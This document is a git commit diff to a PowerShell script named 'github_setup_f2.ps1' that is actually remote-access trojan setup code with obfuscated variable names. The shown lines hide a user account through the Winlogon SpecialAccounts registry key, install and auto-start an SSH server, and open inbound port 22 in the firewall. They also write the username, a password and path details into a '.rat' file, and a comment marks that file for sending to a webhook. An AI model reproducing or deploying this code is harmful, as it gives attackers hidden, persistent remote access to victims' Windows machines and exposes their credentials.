5b44f881292e88a1925d025be342a38fe029e621
Qasim Shahzad <qasimshahzad800@gmail.com>
2026-01-14 04:15:39 +0300

    Update github_setup_f2.ps1

--- github_setup_f2.ps1
+++ github_setup_f2.ps1
@@ -33,11 +33,17 @@ $jmQikqoKMZ = '00000000'
 New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name SpecialAccounts -Force
 New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts' -Name UserList -Force
 New-ItemProperty -Path $csfMFzvgEN -Name $sqbXFdLvyw -Value $jmQikqoKMZ -PropertyType DWORD -Force
-
 # ssh
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 Start-Service sshd
 Set-Service -Name sshd -StartupType 'Automatic'
+
+# Allow firewall for SSH
+New-NetFirewallRule -Name "OpenSSH-Server" -DisplayName "OpenSSH Server" -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
+
+# Create SSH directory and accept localhost key
+New-Item -ItemType Directory -Path "$env:USERPROFILE\.ssh" -Force
+ssh-keyscan -H localhost >> "$env:USERPROFILE\.ssh\known_hosts" 2>$null
 
 # rat file
 $CRYnrkaDbe = "$env:UserName.rat"
@@ -49,7 +55,7 @@ Add-Content -Path $CRYnrkaDbe -Value $DCilJFugpP -Force # pass
 Add-Content -Path $CRYnrkaDbe -Value $env:temp -Force # temp
 Add-Content -Path $CRYnrkaDbe -Value $pwd -Force # startup
 Add-Content -Path $CRYnrkaDbe -Value "N/A" -Force # remote host
-Add-Content -Path $CRYnrkaDbe -Value "22" -Force # remote port
+Add-Content -Path $CRYnrkaDbe -Value "22" -Force # SSH PORT - CHANGED FROM "N/A" TO "22"
 Add-Content -Path $CRYnrkaDbe -Value 'local' -Force # connection type
 
 # send file to webhook
